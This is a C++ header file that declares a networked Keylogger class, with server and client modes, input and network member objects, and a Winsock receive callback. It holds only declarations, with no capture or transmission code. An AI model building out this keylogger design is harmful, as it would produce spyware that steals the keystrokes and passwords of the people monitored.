#pragma once

#include "keyState.h"

#include "NetworkClass.h"
#include "InputClass.h"

#define _Mawi1e_KEYLOGGER_SERVER (0x01)
#define _Mawi1e_KEYLOGGER_CLIENT (0x02)

#include <chrono>

namespace Mawi1e {
	void static __stdcall RecvRoutine(DWORD, DWORD, LPWSAOVERLAPPED, DWORD);

	class Keylogger {
	public:
		Keylogger();
		Keylogger(const Keylogger&);
		~Keylogger();

		bool Initialize(int, const char* = "127.0.0.1");
		void Shutdown();

		void Frame();

	private:
		void ErrorHandling(const char*);

	private:
		InputClass* m_Input;
		NetworkClass* m_Network;

		int m_ServClnt;

	};
}